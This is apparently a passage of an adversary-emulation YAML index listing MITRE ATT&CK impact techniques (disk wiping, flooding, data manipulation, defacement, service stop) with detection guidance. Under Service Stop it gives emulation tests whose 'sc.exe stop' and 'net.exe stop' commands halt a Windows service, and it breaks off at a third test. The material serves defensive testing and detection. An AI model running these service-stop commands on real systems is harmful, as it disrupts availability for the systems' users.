impact:
  T1561.002:
    technique:
      modified: '2023-04-14T19:38:24.089Z'
      name: Disk Structure Wipe
      description: "Adversaries may corrupt or wipe the disk data structures on a
        hard drive necessary to boot a system; targeting specific critical systems
        or in large numbers in a network to interrupt availability to system and network
        resources. \n\nAdversaries may attempt to render the system unable to boot
        by overwriting critical data located in structures such as the master boot
        record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation:
        FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation:
        Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained
        in disk structures may include the initial executable code for loading an
        operating system or the location of the file system partitions on disk. If
        this information is not present, the computer will not be able to load an
        operating system during the boot process, leaving the computer unavailable.
        [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be
        performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001)
        if all sectors of a disk are wiped.\n\nOn a network devices, adversaries may
        reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)
        commands such as `format`.(Citation: format_cmd_cisco)\n\nTo maximize impact
        on the target organization, malware designed for destroying disk structures
        may have worm-like features to propagate across a network by leveraging other
        techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078),
        [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows
        Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec
        Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon
        Nov 2016)(Citation: Kaspersky StoneDrill 2017)"
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: impact
      x_mitre_contributors:
      - Austin Clark, @c2defense
      x_mitre_deprecated: false
      x_mitre_detection: |-
        Look for attempts to read/write to sensitive locations like the master boot record and the disk partition table. Monitor for direct access read/write attempts using the <code>\\\\.\\</code> notation.(Citation: Microsoft Sysmon v6 May 2017) Monitor for unusual kernel driver installation activity.

        For network infrastructure devices, collect AAA logging to monitor for `format` commands being run to erase the file structure and prevent recovery of the device.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      - Network
      x_mitre_version: '1.1'
      x_mitre_data_sources:
      - 'Driver: Driver Load'
      - 'Drive: Drive Modification'
      - 'Drive: Drive Access'
      - 'Command: Command Execution'
      - 'Process: Process Creation'
      x_mitre_impact_type:
      - Availability
      type: attack-pattern
      id: attack-pattern--0af0ca99-357d-4ba1-805f-674fdfb7bef9
      created: '2020-02-20T22:10:20.484Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1561/002
        external_id: T1561.002
      - source_name: format_cmd_cisco
        description: Cisco. (2022, August 16). format - Cisco IOS Configuration Fundamentals
          Command Reference. Retrieved July 13, 2022.
        url: https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/fundamentals/command/cf_command_ref/F_through_K.html#wp2829794668
      - source_name: Unit 42 Shamoon3 2018
        description: Falcone, R. (2018, December 13). Shamoon 3 Targets Oil and Gas
          Organization. Retrieved March 14, 2019.
        url: https://unit42.paloaltonetworks.com/shamoon-3-targets-oil-gas-organization/
      - source_name: Palo Alto Shamoon Nov 2016
        description: 'Falcone, R.. (2016, November 30). Shamoon 2: Return of the Disttrack
          Wiper. Retrieved January 11, 2017.'
        url: http://researchcenter.paloaltonetworks.com/2016/11/unit42-shamoon-2-return-disttrack-wiper/
      - source_name: FireEye Shamoon Nov 2016
        description: FireEye. (2016, November 30). FireEye Responds to Wave of Destructive
          Cyber Attacks in Gulf Region. Retrieved January 11, 2017.
        url: https://www.fireeye.com/blog/threat-research/2016/11/fireeye_respondsto.html
      - source_name: Kaspersky StoneDrill 2017
        description: 'Kaspersky Lab. (2017, March 7). From Shamoon to StoneDrill:
          Wipers attacking Saudi organizations and beyond. Retrieved March 14, 2019.'
        url: https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180722/Report_Shamoon_StoneDrill_final.pdf
      - source_name: Microsoft Sysmon v6 May 2017
        description: Russinovich, M. & Garnier, T. (2017, May 22). Sysmon v6.20. Retrieved
          December 13, 2017.
        url: https://docs.microsoft.com/sysinternals/downloads/sysmon
      - source_name: Symantec Shamoon 2012
        description: Symantec. (2012, August 16). The Shamoon Attacks. Retrieved March
          14, 2019.
        url: https://www.symantec.com/connect/blogs/shamoon-attacks
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1498.001:
    technique:
      modified: '2023-03-30T21:01:53.685Z'
      name: Direct Network Flood
      description: |-
        Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.

        Botnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: impact
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_deprecated: false
      x_mitre_detection: 'Detection of a network flood can sometimes be achieved before
        the traffic volume is sufficient to cause impact to the availability of the
        service, but such response time typically requires very aggressive monitoring
        and responsiveness or services provided by an upstream network service provider.
        Typical network throughput monitoring tools such as netflow(Citation: Cisco
        DoSdetectNetflow), SNMP, and custom scripts can be used to detect sudden increases
        in network or service utilization. Real-time, automated, and qualitative study
        of the network traffic can identify a sudden surge in one type of protocol
        can be used to detect a network flood event as it starts. Often, the lead
        time may be small and the indicator of an event availability of the network
        or service drops. The analysis tools mentioned can then be used to determine
        the type of DoS causing the outage and help with remediation.'
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Windows
      - Azure AD
      - Office 365
      - SaaS
      - IaaS
      - Linux
      - macOS
      - Google Workspace
      x_mitre_version: '1.3'
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Flow'
      - 'Sensor Health: Host Status'
      x_mitre_impact_type:
      - Availability
      type: attack-pattern
      id: attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3
      created: '2020-03-02T20:07:18.651Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1498/001
        external_id: T1498.001
      - source_name: Cisco DoSdetectNetflow
        description: Cisco. (n.d.). Detecting and Analyzing Network Threats With NetFlow.
          Retrieved April 25, 2019.
        url: https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/netflow/configuration/15-mt/nf-15-mt-book/nf-detct-analy-thrts.pdf
      - source_name: USNYAG IranianBotnet March 2016
        description: Preet Bharara, US Attorney. (2016, March 24). Retrieved April
          23, 2019.
        url: https://www.justice.gov/opa/pr/seven-iranians-working-islamic-revolutionary-guard-corps-affiliated-entities-charged
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
    atomic_tests: []
  T1492:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92
      type: attack-pattern
      created: '2019-04-09T11:51:30.942Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1492
        url: https://attack.mitre.org/techniques/T1492
      - description: 'FireEye. (2018, October 03). APT38: Un-usual Suspects. Retrieved
          November 6, 2018.'
        url: https://content.fireeye.com/apt/rpt-apt38
        source_name: FireEye APT38 Oct 2018
      - source_name: DOJ Lazarus Sony 2018
        url: https://www.justice.gov/opa/press-release/file/1092091/download
        description: Department of Justice. (2018, September 6). Criminal Complaint
          - United States of America v. PARK JIN HYOK. Retrieved March 29, 2019.
      modified: '2020-03-02T14:24:26.780Z'
      name: Stored Data Manipulation
      description: "Adversaries may insert, delete, or manipulate data at rest in
        order to manipulate external outcomes or hide activity.(Citation: FireEye
        APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data,
        adversaries may attempt to affect a business process, organizational understanding,
        and decision making. \n\nStored data could include a variety of file formats,
        such as Office files, databases, stored emails, and custom file formats. The
        type of modification and the impact it will have depends on the type of data
        as well as the goals and objectives of the adversary. For complex systems,
        an adversary would likely need special expertise and possibly access to specialized
        software related to the system that would typically be gained through a prolonged
        information gathering campaign in order to have the desired impact."
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: impact
      x_mitre_detection: Where applicable, inspect important file hashes, locations,
        and modifications for suspicious/unexpected values.
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_impact_type:
      - Integrity
      x_mitre_permissions_required:
      - User
      - Administrator
      - root
      - SYSTEM
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1491.002:
    technique:
      x_mitre_platforms:
      - Windows
      - IaaS
      - Linux
      - macOS
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--0cfe31a7-81fc-472c-bc45-e2808d1066a3
      type: attack-pattern
      created: '2020-02-20T14:34:08.496Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1491.002
        url: https://attack.mitre.org/techniques/T1491/002
      - source_name: FireEye Cyber Threats to Media Industries
        url: https://www.fireeye.com/content/dam/fireeye-www/current-threats/pdfs/ib-entertainment.pdf
        description: FireEye. (n.d.). Retrieved April 19, 2019.
      - source_name: Kevin Mandia Statement to US Senate Committee on Intelligence
        url: https://www.intelligence.senate.gov/sites/default/files/documents/os-kmandia-033017.pdf
        description: Kevin Mandia. (2017, March 30). Prepared Statement of Kevin Mandia,
          CEO of FireEye, Inc. before the United States Senate Select Committee on
          Intelligence. Retrieved April 19, 2019.
      - source_name: Anonymous Hackers Deface Russian Govt Site
        url: https://torrentfreak.com/anonymous-hackers-deface-russian-govt-site-to-protest-web-blocking-nsfw-180512/
        description: Andy. (2018, May 12). ‘Anonymous’ Hackers Deface Russian Govt.
          Site to Protest Web-Blocking (NSFW). Retrieved April 19, 2019.
      - source_name: Trend Micro Deep Dive Into Defacement
        url: https://documents.trendmicro.com/assets/white_papers/wp-a-deep-dive-into-defacement.pdf
        description: 'Marco Balduzzi, Ryan Flores, Lion Gu, Federico Maggi, Vincenzo
          Ciancaglini, Roel Reyes, Akira Urano. (n.d.). A Deep Dive into Defacement:
          How Geopolitical Events Trigger Web Attacks. Retrieved April 19, 2019.'
      modified: '2022-03-25T19:34:37.539Z'
      name: External Defacement
      description: 'An adversary may deface systems external to an organization in
        an attempt to deliver messaging, intimidate, or otherwise mislead an organization
        or users. [External Defacement](https://attack.mitre.org/techniques/T1491/002)
        may ultimately cause users to distrust the systems and to question/discredit
        the system’s integrity. Externally-facing websites are a common victim of
        defacement; often targeted by adversary and hacktivist groups in order to
        push a political message or spread propaganda.(Citation: FireEye Cyber Threats
        to Media Industries)(Citation: Kevin Mandia Statement to US Senate Committee
        on Intelligence)(Citation: Anonymous Hackers Deface Russian Govt Site) [External
        Defacement](https://attack.mitre.org/techniques/T1491/002) may be used as
        a catalyst to trigger events, or as a response to actions taken by an organization
        or government. Similarly, website defacement may also be used as setup, or
        a precursor, for future attacks such as [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).(Citation:
        Trend Micro Deep Dive Into Defacement)'
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: impact
      x_mitre_detection: Monitor external websites for unplanned content changes.
        Monitor application logs for abnormal behavior that may indicate attempted
        or successful exploitation. Use deep packet inspection to look for artifacts
        of common exploit traffic, such as SQL injection. Web Application Firewalls
        may detect improper inputs attempting exploitation.
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.2'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Content'
      - 'File: File Creation'
      - 'Application Log: Application Log Content'
      - 'File: File Modification'
      x_mitre_impact_type:
      - Integrity
    atomic_tests: []
  T1499.001:
    technique:
      modified: '2023-03-30T21:01:51.289Z'
      name: OS Exhaustion Flood
      description: |-
        Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.

        Different ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)

        ACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: impact
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_deprecated: false
      x_mitre_detection: 'Detection of Endpoint DoS can sometimes be achieved before
        the effect is sufficient to cause significant impact to the availability of
        the service, but such response time typically requires very aggressive monitoring
        and responsiveness. Typical network throughput monitoring tools such as netflow,
        SNMP, and custom scripts can be used to detect sudden increases in circuit
        utilization.(Citation: Cisco DoSdetectNetflow) Real-time, automated, and qualitative
        study of the network traffic can identify a sudden surge in one type of protocol
        can be used to detect an attack as it starts.'
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_version: '1.2'
      x_mitre_data_sources:
      - 'Sensor Health: Host Status'
      - 'Network Traffic: Network Traffic Content'
      - 'Network Traffic: Network Traffic Flow'
      x_mitre_impact_type:
      - Availability
      type: attack-pattern
      id: attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7
      created: '2020-02-20T15:27:18.581Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1499/001
        external_id: T1499.001
      - source_name: Cisco DoSdetectNetflow
        description: Cisco. (n.d.). Detecting and Analyzing Network Threats With NetFlow.
          Retrieved April 25, 2019.
        url: https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/netflow/configuration/15-mt/nf-15-mt-book/nf-detct-analy-thrts.pdf
      - source_name: Cloudflare SynFlood
        description: Cloudflare. (n.d.). What is a SYN flood attack?. Retrieved April
          22, 2019.
        url: https://www.cloudflare.com/learning/ddos/syn-flood-ddos-attack/
      - source_name: Corero SYN-ACKflood
        description: Corero. (n.d.). What is a SYN-ACK Flood Attack?. Retrieved April
          22, 2019.
        url: https://www.corero.com/resources/ddos-attack-types/syn-flood-ack.html
      - source_name: Arbor AnnualDoSreport Jan 2018
        description: Philippe Alcoy, Steinthor Bjarnason, Paul Bowen, C.F. Chui, Kirill
          Kasavchnko, and Gary Sockrider of Netscout Arbor. (2018, January). Insight
          into the Global Threat Landscape - Netscout Arbor's 13th Annual Worldwide
          Infrastructure Security Report. Retrieved April 22, 2019.
        url: https://pages.arbornetworks.com/rs/082-KNA-087/images/13th_Worldwide_Infrastructure_Security_Report.pdf
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
    atomic_tests: []
  T1499.003:
    technique:
      x_mitre_platforms:
      - Windows
      - Azure AD
      - Office 365
      - SaaS
      - IaaS
      - Linux
      - macOS
      - Google Workspace
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9
      type: attack-pattern
      created: '2020-02-20T15:35:00.025Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1499.003
        url: https://attack.mitre.org/techniques/T1499/003
      - source_name: Arbor AnnualDoSreport Jan 2018
        url: https://pages.arbornetworks.com/rs/082-KNA-087/images/13th_Worldwide_Infrastructure_Security_Report.pdf
        description: Philippe Alcoy, Steinthor Bjarnason, Paul Bowen, C.F. Chui, Kirill
          Kasavchnko, and Gary Sockrider of Netscout Arbor. (2018, January). Insight
          into the Global Threat Landscape - Netscout Arbor's 13th Annual Worldwide
          Infrastructure Security Report. Retrieved April 22, 2019.
      - source_name: Cisco DoSdetectNetflow
        url: https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/netflow/configuration/15-mt/nf-15-mt-book/nf-detct-analy-thrts.pdf
        description: Cisco. (n.d.). Detecting and Analyzing Network Threats With NetFlow.
          Retrieved April 25, 2019.
      modified: '2022-03-25T18:07:45.176Z'
      name: Application Exhaustion Flood
      description: 'Adversaries may target resource intensive features of applications
        to cause a denial of service (DoS), denying availability to those applications.
        For example, specific features in web applications may be highly resource
        intensive. Repeated requests to those features may be able to exhaust system
        resources and deny access to the application or the server itself.(Citation:
        Arbor AnnualDoSreport Jan 2018)'
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: impact
      x_mitre_detection: |-
        Detection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Typical network throughput monitoring tools such as netflow, SNMP, and custom scripts can be used to detect sudden increases in circuit utilization.(Citation: Cisco DoSdetectNetflow) Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an attack as it starts.

        In addition to network level detections, endpoint logging and instrumentation can be useful for detection. Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack, possibly before the impact is felt.
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.2'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Content'
      - 'Sensor Health: Host Status'
      - 'Network Traffic: Network Traffic Flow'
      - 'Application Log: Application Log Content'
      x_mitre_impact_type:
      - Availability
    atomic_tests: []
  T1561:
    technique:
      modified: '2023-04-20T18:16:41.942Z'
      name: Disk Wipe
      description: |-
        Adversaries may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources. With direct write access to a disk, adversaries may attempt to overwrite portions of disk data. Adversaries may opt to wipe arbitrary portions of disk data and/or wipe disk structures like the master boot record (MBR). A complete wipe of all disk sectors may be attempted.

        To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disks may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta Blockbuster Destructive Malware)

        On network devices, adversaries may wipe configuration files and other data from the device using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `erase`.(Citation: erase_cmd_cisco)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: impact
      x_mitre_contributors:
      - Austin Clark, @c2defense
      x_mitre_deprecated: false
      x_mitre_detection: 'Look for attempts to read/write to sensitive locations like
        the partition boot sector, master boot record, disk partition table, or BIOS
        parameter block/superblock. Monitor for direct access read/write attempts
        using the <code>\\\\.\\</code> notation.(Citation: Microsoft Sysmon v6 May
        2017) Monitor for unusual kernel driver installation activity.'
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      - Network
      x_mitre_version: '1.1'
      x_mitre_data_sources:
      - 'Process: Process Creation'
      - 'Drive: Drive Modification'
      - 'Drive: Drive Access'
      - 'Command: Command Execution'
      - 'Driver: Driver Load'
      x_mitre_impact_type:
      - Availability
      type: attack-pattern
      id: attack-pattern--1988cc35-ced8-4dad-b2d1-7628488fa967
      created: '2020-02-20T22:02:20.372Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1561
        external_id: T1561
      - source_name: erase_cmd_cisco
        description: Cisco. (2022, August 16). erase - Cisco IOS Configuration Fundamentals
          Command Reference . Retrieved July 13, 2022.
        url: https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/fundamentals/command/cf_command_ref/D_through_E.html#wp3557227463
      - source_name: Novetta Blockbuster Destructive Malware
        description: 'Novetta Threat Research Group. (2016, February 24). Operation
          Blockbuster: Destructive Malware Report. Retrieved March 2, 2016.'
        url: https://web.archive.org/web/20160303200515/https://operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf
      - source_name: Microsoft Sysmon v6 May 2017
        description: Russinovich, M. & Garnier, T. (2017, May 22). Sysmon v6.20. Retrieved
          December 13, 2017.
        url: https://docs.microsoft.com/sysinternals/downloads/sysmon
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1565.001:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      type: attack-pattern
      id: attack-pattern--1cfcb312-b8d7-47a4-b560-4b16cc677292
      created: '2020-03-02T14:22:24.410Z'
      x_mitre_version: '1.1'
      external_references:
      - source_name: mitre-attack
        external_id: T1565.001
        url: https://attack.mitre.org/techniques/T1565/001
      - source_name: DOJ Lazarus Sony 2018
        url: https://www.justice.gov/opa/press-release/file/1092091/download
        description: Department of Justice. (2018, September 6). Criminal Complaint
          - United States of America v. PARK JIN HYOK. Retrieved March 29, 2019.
      - source_name: FireEye APT38 Oct 2018
        url: https://content.fireeye.com/apt/rpt-apt38
        description: 'FireEye. (2018, October 03). APT38: Un-usual Suspects. Retrieved
          November 6, 2018.'
      x_mitre_deprecated: false
      revoked: false
      description: |-
        Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.

        Stored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.
      modified: '2022-04-19T23:03:49.461Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      name: Stored Data Manipulation
      x_mitre_detection: Where applicable, inspect important file hashes, locations,
        and modifications for suspicious/unexpected values.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: impact
      x_mitre_is_subtechnique: true
      x_mitre_data_sources:
      - 'File: File Deletion'
      - 'File: File Creation'
      - 'File: File Modification'
      x_mitre_impact_type:
      - Integrity
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1489:
    technique:
      x_mitre_platforms:
      - Windows
      - Linux
      - macOS
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      type: attack-pattern
      id: attack-pattern--20fb2507-d71c-455d-9b6d-6104461cf26b
      created: '2019-03-29T19:00:55.901Z'
      x_mitre_version: '1.2'
      external_references:
      - source_name: mitre-attack
        external_id: T1489
        url: https://attack.mitre.org/techniques/T1489
      - source_name: SecureWorks WannaCry Analysis
        url: https://www.secureworks.com/research/wcry-ransomware-analysis
        description: Counter Threat Unit Research Team. (2017, May 18). WCry Ransomware
          Analysis. Retrieved March 26, 2019.
      - source_name: Talos Olympic Destroyer 2018
        url: https://blog.talosintelligence.com/2018/02/olympic-destroyer.html
        description: Mercer, W. and Rascagneres, P. (2018, February 12). Olympic Destroyer
          Takes Aim At Winter Olympics. Retrieved March 14, 2019.
      - source_name: Novetta Blockbuster
        url: https://web.archive.org/web/20160226161828/https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf
        description: 'Novetta Threat Research Group. (2016, February 24). Operation
          Blockbuster: Unraveling the Long Thread of the Sony Attack. Retrieved February
          25, 2016.'
      x_mitre_deprecated: false
      revoked: false
      description: "Adversaries may stop or disable services on a system to render
        those services unavailable to legitimate users. Stopping critical services
        or processes can inhibit or stop response to an incident or aid in the adversary's
        overall objectives to cause damage to the environment.(Citation: Talos Olympic
        Destroyer 2018)(Citation: Novetta Blockbuster) \n\nAdversaries may accomplish
        this by disabling individual services of high importance to an organization,
        such as <code>MSExchangeIS</code>, which will make Exchange content inaccessible
        (Citation: Novetta Blockbuster). In some cases, adversaries may stop or disable
        many or all services to render systems unusable.(Citation: Talos Olympic Destroyer
        2018) Services or processes may not allow for modification of their data stores
        while running. Adversaries may stop services or processes in order to conduct
        [Data Destruction](https://attack.mitre.org/techniques/T1485) or [Data Encrypted
        for Impact](https://attack.mitre.org/techniques/T1486) on the data stores
        of services like Exchange and SQL Server.(Citation: SecureWorks WannaCry Analysis)"
      modified: '2022-07-28T18:47:11.957Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      name: Service Stop
      x_mitre_detection: |-
        Monitor processes and command-line arguments to see if critical processes are terminated or stop running.

        Monitor for edits for modifications to services and startup programs that correspond to services of high importance. Look for changes to services that do not correlate with known software, patch cycles, etc. Windows service information is stored in the Registry at <code>HKLM\SYSTEM\CurrentControlSet\Services</code>. Systemd service unit files are stored within the /etc/systemd/system, /usr/lib/systemd/system/, and /home/.config/systemd/user/ directories, as well as associated symbolic links.

        Alterations to the service binary path or the service startup type changed to disabled may be suspicious.

        Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. For example, <code>ChangeServiceConfigW</code> may be used by an adversary to prevent services from starting.(Citation: Talos Olympic Destroyer 2018)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: impact
      x_mitre_is_subtechnique: false
      x_mitre_data_sources:
      - 'Process: Process Termination'
      - 'Process: OS API Execution'
      - 'Command: Command Execution'
      - 'Service: Service Metadata'
      - 'Windows Registry: Windows Registry Key Modification'
      - 'File: File Modification'
      - 'Process: Process Creation'
      x_mitre_impact_type:
      - Availability
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1489
    atomic_tests:
    - name: Windows - Stop service using Service Controller
      auto_generated_guid: 21dfb440-830d-4c86-a3e5-2a491d5a8d04
      description: |
        Stops a specified service using the sc.exe command. Upon execution, if the spooler service was running infomration will be displayed saying
        it has changed to a state of STOP_PENDING. If the spooler service was not running "The service has not been started." will be displayed and it can be
        started by running the cleanup command.
      supported_platforms:
      - windows
      input_arguments:
        service_name:
          description: Name of a service to stop
          type: string
          default: spooler
      executor:
        command: 'sc.exe stop #{service_name}

          '
        cleanup_command: 'sc.exe start #{service_name} >nul 2>&1

          '
        name: command_prompt
        elevation_required: true
    - name: Windows - Stop service using net.exe
      auto_generated_guid: 41274289-ec9c-4213-bea4-e43c4aa57954
      description: |
        Stops a specified service using the net.exe command. Upon execution, if the service was running "The Print Spooler service was stopped successfully."
        will be displayed. If the service was not running, "The Print Spooler service is not started." will be displayed and it can be
        started by running the cleanup command.
      supported_platforms:
      - windows
      input_arguments:
        service_name:
          description: Name of a service to stop
          type: string
          default: spooler
      executor:
        command: 'net.exe stop #{service_name}

          '
        cleanup_command: 'net.exe start #{service_name} >nul 2>&1

          '
        name: command_prompt
        elevation_required: true
    - name: Windows - Stop service by killing process
